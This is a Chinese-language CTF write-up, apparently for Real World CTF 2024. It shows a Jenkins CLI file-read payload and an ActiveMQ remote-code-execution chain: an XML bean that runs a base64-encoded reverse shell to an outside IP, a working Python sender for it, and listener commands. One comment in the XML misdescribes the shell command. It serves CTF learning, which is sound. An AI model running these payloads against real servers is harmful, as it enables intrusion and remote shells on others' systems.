---
title: RWCTF wp
author: patrik
categories:
  - "安全\U0001F510"
  - "CTF\U0001F6A9"
top: 21
abbrlink: 6645322e
date: 2024-01-29 17:00:00
tags:
---



## Be-a-Security-Researcher

### 下载客户端

```
http://47.96.171.129:8080/jnlpJars/jenkins-cli.jar
```

CLI 客户端可以直接在URL `/jnlpJars/jenkins-cli.jar`从Jenkins主机下载, 实际上 `https://JENKINS_URL/jnlpJars/jenkins-cli.jar`

当 `.jar` 用于 Jenkins的不同版本时, 在使用时出现兼容性问题, 请重新从Jenkins主机下载最新的 `.jar`文件。

### 使用客户端

调用客户端的一般语法如下:

```
java -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]
```

payload

```
java.exe -jar .\jenkins-cli.jar -s http://47.96.171.129:8080/  -webSocket who-am-i "@/flag"
```

![CleanShot2024-01-29at18.25.51@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot2024-01-29at18.25.51@2x.png)

## Be-an-ActiveMq-Hacker

### poc.xml

服务器vps上写一个poc.xml

例如：反弹到101.43.189.65 3379端口

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTg5LjY1LzMzNzkgMD4mMQ==}|{base64,-d}|{bash,-i}</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

开启http服务

```bash
python3 -m http.server 3309
```

再开个终端NC监听反弹端口3379

```bash
nc -nvlp 3379
```

### poc.py

运行poc.py

```python
import io
import socket
import sys


def main(ip, port, xml):
    classname = "org.springframework.context.support.ClassPathXmlApplicationContext"
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_obj.connect((ip, port))

    with socket_obj:
        out = socket_obj.makefile('wb')
        # out = io.BytesIO()  # 创建一个内存中的二进制流
        out.write(int(32).to_bytes(4, 'big'))
        out.write(bytes([31]))
        out.write(int(1).to_bytes(4, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(int(1).to_bytes(4, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(len(classname).to_bytes(2, 'big'))
        out.write(classname.encode('utf-8'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(len(xml).to_bytes(2, 'big'))
        out.write(xml.encode('utf-8'))
        # print(list(out.getvalue()))
        out.flush()
        out.close()


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 "
              "http://192.168.0.101:8888/poc.xml")
        exit(-1)
    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])

```

```bash
python3 poc.py 120.26.63.137 61616 http://101.43.189.65:3309/poc.xml
```

![CleanShot2024-01-29at18.38.34@2x](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot 2024-01-29 at 18.38.34@2x.png)

![image-20240307112423113](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112423113.png)

## Be-More-Elegant

文件上传Filename绕过

![image-20240307112559502](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112559502.png)

![image-20240307112609509](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112609509.png)

![image-20240307112618306](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112618306.png)

![image-20240307112629678](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112629678.png)

![image-20240307112639725](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112639725.png)